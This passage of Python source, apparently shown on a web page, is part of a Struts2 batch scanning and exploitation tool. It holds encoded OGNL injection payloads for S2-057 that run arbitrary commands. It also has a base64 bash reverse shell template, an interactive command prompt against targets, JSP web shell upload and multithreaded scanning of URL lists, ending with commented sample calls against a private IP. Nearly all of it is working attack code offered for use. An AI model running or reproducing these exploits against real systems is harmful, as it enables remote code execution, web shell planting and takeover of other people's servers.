&quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        html = get_stream(self.url + self.exec_payload.format(cmd=quote(cmd)), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_057:</span><br><span class="line">    &quot;&quot;&quot;S2-057漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-057:影响版本Struts 2.0.4-2.3.34, Struts 2.5.0-2.5.16; GET请求发送数据; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    check_poc = &quot;%24%7BNUM1%2BNUM2%7D&quot;</span><br><span class="line">    exec_payload1 = &quot;%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D&quot;</span><br><span class="line">    exec_payload2 = &quot;%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D&quot;</span><br><span class="line">    exec_payload3 = &quot;%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D&quot;</span><br><span class="line">    exec_payload4 = &quot;%24%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&quot;.action&quot;):</span><br><span class="line">            rindex = url.rindex(&#x27;/&#x27;)</span><br><span class="line">            self.url = url[:rindex + 1]</span><br><span class="line">            self.name = url[rindex + 1:]</span><br><span class="line">        elif url.endswith(&quot;/&quot;):</span><br><span class="line">            self.url = url</span><br><span class="line">            self.name = &quot;index.action&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">            self.name = &quot;index.action&quot;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.replace(&quot;NUM1&quot;, str(num1)).replace(&quot;NUM2&quot;, str(num2))</span><br><span class="line">        url = self.url + poc + &quot;/&quot; + self.name</span><br><span class="line">        html = get_302(url, self.headers, self.encoding)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if str(num1 + num2) in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-057&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def choice_exp(self):</span><br><span class="line">        &quot;&quot;&quot;选择可用的exp&quot;&quot;&quot;</span><br><span class="line">        payloads = [self.exec_payload1, self.exec_payload2, self.exec_payload3, self.exec_payload4]</span><br><span class="line">        hash_str = get_hash()</span><br><span class="line">        for exp in payloads:</span><br><span class="line">            payload = exp.format(cmd=quote(&quot;echo &quot; + hash_str))</span><br><span class="line">            url = self.url + payload + &quot;/&quot; + self.name</span><br><span class="line">            html = get_302(url, self.headers, self.encoding)</span><br><span class="line">            if hash_str in html:</span><br><span class="line">                return exp</span><br><span class="line">        return &quot;ERROR: 无可用Payload!&quot;</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        exp = self.choice_exp()</span><br><span class="line">        if exp.startswith(&#x27;ERROR:&#x27;):</span><br><span class="line">            return exp</span><br><span class="line"> </span><br><span class="line">        payload = exp.format(cmd=quote(cmd))</span><br><span class="line">        url = self.url + payload + &quot;/&quot; + self.name</span><br><span class="line">        html = get_302(url, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># 所有漏洞名称</span><br><span class="line">s2_dict = &#123;&#x27;S2_001&#x27;: S2_001, &#x27;S2_003&#x27;: S2_003, &#x27;S2_005&#x27;: S2_005, &#x27;S2_007&#x27;: S2_007, &#x27;S2_008&#x27;: S2_008, &#x27;S2_009&#x27;: S2_009,</span><br><span class="line">           &#x27;S2_012&#x27;: S2_012, &#x27;S2_013&#x27;: S2_013, &#x27;S2_015&#x27;: S2_015, &#x27;S2_016&#x27;: S2_016, &#x27;S2_019&#x27;: S2_019, &#x27;S2_029&#x27;: S2_029,</span><br><span class="line">           &#x27;S2_032&#x27;: S2_032, &#x27;S2_033&#x27;: S2_033, &#x27;S2_037&#x27;: S2_037, &#x27;S2_045&#x27;: S2_045, &#x27;S2_046&#x27;: S2_046, &#x27;S2_048&#x27;: S2_048,</span><br><span class="line">           &#x27;S2_052&#x27;: S2_052, &#x27;S2_053&#x27;: S2_053, &#x27;S2_devMode&#x27;: S2_devMode, &quot;S2_057&quot;: S2_057&#125;</span><br><span class="line"># S2-052不支持漏洞扫描和检查</span><br><span class="line">s2_list1 = [S2_001, S2_003, S2_005, S2_007, S2_008, S2_009, S2_012, S2_013, S2_015, S2_016, S2_019,</span><br><span class="line">           S2_029, S2_032, S2_033, S2_037, S2_045, S2_046, S2_048, S2_053, S2_devMode, S2_057]</span><br><span class="line">s2_list = [&#x27;S2_001&#x27;, &#x27;S2_003&#x27;, &#x27;S2_005&#x27;, &#x27;S2_007&#x27;, &#x27;S2_008&#x27;, &#x27;S2_009&#x27;, &#x27;S2_012&#x27;, &#x27;S2_013&#x27;, &#x27;S2_015&#x27;, &#x27;S2_016&#x27;, &#x27;S2_019&#x27;,</span><br><span class="line">           &#x27;S2_029&#x27;, &#x27;S2_032&#x27;, &#x27;S2_033&#x27;, &#x27;S2_037&#x27;, &#x27;S2_045&#x27;, &#x27;S2_046&#x27;, &#x27;S2_048&#x27;, &#x27;S2_053&#x27;, &#x27;S2_devMode&#x27;, &#x27;S2_057&#x27;]</span><br><span class="line"> </span><br><span class="line"># 支持获取WEB路径的漏洞名称列表</span><br><span class="line">webpath_names = [&quot;S2_001&quot;, &quot;S2_005&quot;, &quot;S2_013&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;, &quot;S2_032&quot;, &quot;S2_037&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;, &quot;S2_devMode&quot;]</span><br><span class="line"># 支持命令执行的漏洞名称列表</span><br><span class="line">exec_names = [&quot;S2_001&quot;, &quot;S2_003&quot;, &quot;S2_005&quot;, &quot;S2_007&quot;, &quot;S2_008&quot;, &quot;S2_009&quot;, &quot;S2_013&quot;, &quot;S2_015&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;,</span><br><span class="line">              &quot;S2_029&quot;, &quot;S2_032&quot;, &quot;S2_033&quot;, &quot;S2_037&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;, &quot;S2_048&quot;, &quot;S2_052&quot;, &quot;S2_053&quot;, &quot;S2_devMode&quot;,</span><br><span class="line">              &quot;S2_057&quot;]</span><br><span class="line"># 支持反弹shell的漏洞名称列表</span><br><span class="line">reverse_names = [&quot;S2_001&quot;, &quot;S2_007&quot;, &quot;S2_008&quot;, &quot;S2_009&quot;, &quot;S2_013&quot;, &quot;S2_015&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;, &quot;S2_029&quot;, &quot;S2_032&quot;,</span><br><span class="line">                 &quot;S2_033&quot;, &quot;S2_037&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;, &quot;S2_048&quot;, &quot;S2_052&quot;, &quot;S2_053&quot;, &quot;S2_devMode&quot;, &quot;S2_057&quot;]</span><br><span class="line"># 支持文件上传的漏洞名称列表</span><br><span class="line">upload_names = [&quot;S2_013&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;]</span><br><span class="line"> </span><br><span class="line">banner = &quot;&quot;&quot;</span><br><span class="line"> ____  _              _       ____    ____                  </span><br><span class="line">/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __  </span><br><span class="line">\___ \| __| &#x27;__| | | | __/ __| __) | \___ \ / __/ _` | &#x27;_ \ </span><br><span class="line"> ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |</span><br><span class="line">|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|</span><br><span class="line"> </span><br><span class="line">                                      Author By HatBoy        </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def show_info():</span><br><span class="line">    &quot;&quot;&quot;漏洞详情介绍&quot;&quot;&quot;</span><br><span class="line">    click.secho(&quot;[+] 支持如下Struts2漏洞:&quot;, fg=&#x27;red&#x27;)</span><br><span class="line">    for k, v in s2_dict.items():</span><br><span class="line">        click.secho(v.info, fg=&#x27;green&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_one(s):</span><br><span class="line">    &quot;&quot;&quot;检测单个漏洞&quot;&quot;&quot;</span><br><span class="line">    result = s.check()</span><br><span class="line">    return result</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def scan_one(url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">    &quot;&quot;&quot;扫描单个URL漏洞&quot;&quot;&quot;</span><br><span class="line">    click.secho(&#x27;[+] 正在扫描URL:&#x27; + url, fg=&#x27;green&#x27;)</span><br><span class="line">    ss = [s(url, data, headers, encoding) for s in s2_list1]</span><br><span class="line">    with futures.ThreadPoolExecutor(max_workers=10) as executor:</span><br><span class="line">        results = list(executor.map(check_one, ss))</span><br><span class="line">    results = &#123;r for r in results if r&#125;</span><br><span class="line">    click.secho(&#x27;[*] ----------------results------------------&#x27;.format(url=url), fg=&#x27;green&#x27;)</span><br><span class="line">    if (not results) and (not is_quiet):</span><br><span class="line">        click.secho(&#x27;[*] &#123;url&#125; 未发现漏洞&#x27;.format(url=url), fg=&#x27;red&#x27;)</span><br><span class="line">    for r in results:</span><br><span class="line">        if r.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            click.secho(&#x27;[ERROR] &#123;url&#125; 访问出错: &#123;error&#125;&#x27;.format(url=url, error=r[6:]), fg=&#x27;red&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            click.secho(&#x27;[*] &#123;url&#125; 存在漏洞: &#123;name&#125;&#x27;.format(url=url, name=r), fg=&#x27;red&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def scan_more(urls, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">    &quot;&quot;&quot;批量扫描URL&quot;&quot;&quot;</span><br><span class="line">    scan = partial(scan_one, data=data, headers=headers, encoding=encoding)</span><br><span class="line">    with futures.ProcessPoolExecutor(max_workers=process) as executor:</span><br><span class="line">        results = list(executor.map(scan, urls))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">CONTEXT_SETTINGS = dict(help_option_names=[&#x27;-h&#x27;, &#x27;--help&#x27;])</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">@click.command(context_settings=CONTEXT_SETTINGS)</span><br><span class="line">@click.option(&#x27;-i&#x27;, &#x27;--info&#x27;, is_flag=True, help=&quot;漏洞信息介绍&quot;)</span><br><span class="line">@click.option(&#x27;-v&#x27;, &#x27;--version&#x27;, is_flag=True, help=&quot;显示工具版本&quot;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, help=&quot;URL地址&quot;)</span><br><span class="line">@click.option(&#x27;-n&#x27;, &#x27;--name&#x27;, help=&quot;指定漏洞名称, 漏洞名称详见info&quot;)</span><br><span class="line">@click.option(&#x27;-f&#x27;, &#x27;--file&#x27;, help=&quot;批量扫描URL文件, 一行一个URL&quot;)</span><br><span class="line">@click.option(&#x27;-d&#x27;, &#x27;--data&#x27;, help=&quot;POST参数, 需要使用的payload使用&#123;exp&#125;填充, 如: name=test&amp;passwd=&#123;exp&#125;&quot;)</span><br><span class="line">@click.option(&#x27;-c&#x27;, &#x27;--encode&#x27;, default=&quot;UTF-8&quot;, help=&quot;页面编码, 默认UTF-8编码&quot;)</span><br><span class="line">@click.option(&#x27;-p&#x27;, &#x27;--proxy&#x27;, help=&quot;HTTP代理. 格式为http://ip:port&quot;)</span><br><span class="line">@click.option(&#x27;-t&#x27;, &#x27;--timeout&#x27;, help=&quot;HTTP超时时间, 默认10s&quot;)</span><br><span class="line">@click.option(&#x27;-w&#x27;, &#x27;--workers&#x27;, help=&quot;批量扫描进程数, 默认为10个进程&quot;)</span><br><span class="line">@click.option(&#x27;--header&#x27;, help=&quot;HTTP请求头, 格式为: key1=value1&amp;key2=value2&quot;)</span><br><span class="line">@click.option(&#x27;-e&#x27;, &#x27;--exec&#x27;, is_flag=True, help=&quot;进入命令执行shell&quot;)</span><br><span class="line">@click.option(&#x27;--webpath&#x27;, is_flag=True, help=&quot;获取WEB路径&quot;)</span><br><span class="line">@click.option(&#x27;-r&#x27;, &#x27;--reverse&#x27;, help=&quot;反弹shell地址, 格式为ip:port&quot;)</span><br><span class="line">@click.option(&#x27;--upfile&#x27;, help=&quot;需要上传的文件路径和名称&quot;)</span><br><span class="line">@click.option(&#x27;--uppath&#x27;, help=&quot;上传的目录和名称, 如: /usr/local/tomcat/webapps/ROOT/shell.jsp&quot;)</span><br><span class="line">@click.option(&#x27;-q&#x27;, &#x27;--quiet&#x27;, is_flag=True, help=&quot;关闭打印不存在漏洞的输出，只保留存在漏洞的输出&quot;)</span><br><span class="line">def main(info, version, url, file, name, data, header, encode, proxy, exec, reverse, upfile, uppath, quiet, timeout,</span><br><span class="line">         workers, webpath):</span><br><span class="line">    &quot;&quot;&quot;Struts2批量扫描利用工具&quot;&quot;&quot;</span><br><span class="line">    global proxies, is_quiet, _tiemout, process</span><br><span class="line">    click.secho(banner, fg=&#x27;red&#x27;)</span><br><span class="line">    if not encode:</span><br><span class="line">        encode = &#x27;UTF-8&#x27;</span><br><span class="line">    if info:</span><br><span class="line">        show_info()</span><br><span class="line">        exit(0)</span><br><span class="line">    if version:</span><br><span class="line">        click.secho(&quot;[+] Struts2 Scan V0.1&quot;, fg=&#x27;green&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line">    if proxy:</span><br><span class="line">        proxies = &#123;</span><br><span class="line">            &quot;http&quot;: proxy,</span><br><span class="line">            &quot;https&quot;: proxy</span><br><span class="line">        &#125;</span><br><span class="line">    if quiet:</span><br><span class="line">        is_quiet = True</span><br><span class="line">    if timeout and check_int(&#x27;timeout&#x27;, timeout):</span><br><span class="line">        _tiemout = check_int(&#x27;timeout&#x27;, timeout)</span><br><span class="line">    if workers and check_int(&#x27;workers&#x27;, workers):</span><br><span class="line">        process = check_int(&#x27;workers&#x27;, workers)</span><br><span class="line">    if url and not name:</span><br><span class="line">        scan_one(url, data, header, encode)</span><br><span class="line">    if file:</span><br><span class="line">        urls = read_urls(file)</span><br><span class="line">        scan_more(urls, data, header, encode)</span><br><span class="line">    if name and url:</span><br><span class="line">        # 指定漏洞利用</span><br><span class="line">        name = name.upper().replace(&#x27;-&#x27;, &#x27;_&#x27;)</span><br><span class="line">        if name not in s2_list:</span><br><span class="line">            click.secho(&quot;[ERROR] 暂不支持&#123;name&#125;漏洞利用&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">            exit(0)</span><br><span class="line">        s = s2_dict[name](url, data, header, encode)</span><br><span class="line">        s.check()</span><br><span class="line">        if not s.is_vul:</span><br><span class="line">            click.secho(&quot;[ERROR] 该URL不存在&#123;name&#125;漏洞&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">        if webpath:</span><br><span class="line">            if name in webpath_names:</span><br><span class="line">                web_path = s.get_path()</span><br><span class="line">                click.secho(&quot;[*] &#123;webpath&#125;&quot;.format(webpath=web_path), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] 漏洞&#123;name&#125;不支持获取WEB路径&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        if reverse:</span><br><span class="line">            if name in reverse_names:</span><br><span class="line">                click.secho(&quot;[*] 请在反弹地址处监听端口如: nc -lvvp 8080&quot;, fg=&quot;red&quot;)</span><br><span class="line">                if &#x27;:&#x27; not in reverse:</span><br><span class="line">                    click.secho(&quot;[ERROR] reverse反弹地址格式不对,正确格式为: 192.168.1.10:8080&quot;, fg=&quot;red&quot;)</span><br><span class="line">                ip = reverse.split(&#x27;:&#x27;)[0].strip()</span><br><span class="line">                port = reverse.split(&#x27;:&#x27;)[1].strip()</span><br><span class="line">                s.reverse_shell(ip, port)</span><br><span class="line">                exit(0)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] 漏洞&#123;name&#125;不支持反弹shell&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        if upfile and uppath:</span><br><span class="line">            if name in upload_names and check_file(upfile):</span><br><span class="line">                result = s.upload_shell(uppath, upfile)</span><br><span class="line">                if result is True:</span><br><span class="line">                    click.secho(&quot;[+] 文件上传成功!&quot;, fg=&quot;green&quot;)</span><br><span class="line">                    exit(0)</span><br><span class="line">                elif str(result).startswith(&quot;ERROR:&quot;):</span><br><span class="line">                    click.secho(&quot;[ERROR] 文件上传失败! &#123;error&#125;&quot;.format(error=result[6:]), fg=&quot;red&quot;)</span><br><span class="line">                    exit(0)</span><br><span class="line">                else:</span><br><span class="line">                    click.secho(&quot;[ERROR] 文件上传失败! \n&#123;error&#125;&quot;.format(error=result), fg=&quot;red&quot;)</span><br><span class="line">                    exit(0)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] 漏洞&#123;name&#125;不支持文件上传&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        if exec:</span><br><span class="line">            if name in exec_names:</span><br><span class="line">                if name == &quot;S2_052&quot;:</span><br><span class="line">                    click.secho(&quot;[+] 提示: S2_052命令执行无回显，可将结果写入文件访问&quot;, fg=&#x27;red&#x27;)</span><br><span class="line">                while True:</span><br><span class="line">                    cmd = input(&#x27;&gt;&gt;&gt;&#x27;)</span><br><span class="line">                    result = s.exec_cmd(cmd)</span><br><span class="line">                    click.secho(result, fg=&#x27;red&#x27;)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] 漏洞&#123;name&#125;不支持命令执行&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        click.secho(s.info, fg=&#x27;green&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    try:</span><br><span class="line">        main()</span><br><span class="line">    except KeyboardInterrupt as e:</span><br><span class="line">        exit(0)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        click.secho(&quot;[ERROR] &#123;error&#125;&quot;.format(error=e), fg=&#x27;red&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"># s = S2_001(&quot;http://192.168.100.8:8080/login.action&quot;)</span><br><span class="line"># print(s.info)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -al&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s =  S2_003(&quot;http://192.168.100.8:8080/showcase.action&quot;)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"> </span><br><span class="line"># s = S2_005(&quot;http://192.168.100.8:8080/example/HelloWorld.action&quot;)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -al&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_007(&quot;http://192.168.100.8:8080/user.action&quot;, &quot;name=admin&amp;email=admin&amp;age=&#123;exp&#125;&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_008(&quot;http://192.168.100.8:8080&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_009(&quot;http://192.168.100.8:8080/ajax/example5.action?age=123&quot;, &quot;name&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_012(&quot;http://192.168.100.8:8080/S2-012/user.action?name=&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_013(&quot;http://192.168.100.8:8080/S2-013/link.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"># s = S2_015(&quot;http://192.168.100.8:8080/param.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_016(&quot;http://192.168.100.8:8080/index.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.exec_cmd1(&#x27;ls -la&#x27;))</span><br><span class="line"># print(&#x27;---------------------&#x27;)</span><br><span class="line"># print(s.exec_cmd2(&#x27;ls -la&#x27;))</span><br><span class="line"># print(&#x27;---------------------&#x27;)</span><br><span class="line"># print(s.exec_cmd3(&#x27;ls -la&#x27;))</span><br><span class="line"># print(s.upload_shell1(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_019(&quot;http://192.168.100.8:8080/example/HelloWorld.action&quot;)</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_029(&quot;http://192.168.100.8/default.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_032(&quot;http://192.168.100.8:8080/index.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_033(&quot;http://192.168.100.8/orders/3&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_037(&quot;http://192.168.100.8:8080/orders/3/&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_045(&quot;http://192.168.100.8/memoshow.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_046(&quot;http://192.168.100.8/doUpload.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"># s = S2_052(&#x27;http://192.168.100.8/orders/3/edit&#x27;)</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_048(&quot;http://192.168.100.8/integration/saveGangster.action&quot;, data=&#x27;name=&#123;exp&#125;&amp;age=123&amp;__checkbox_bustedBefore=true&amp;description=123&#x27;)</span><br><span class="line"># s.check()</span><br><span 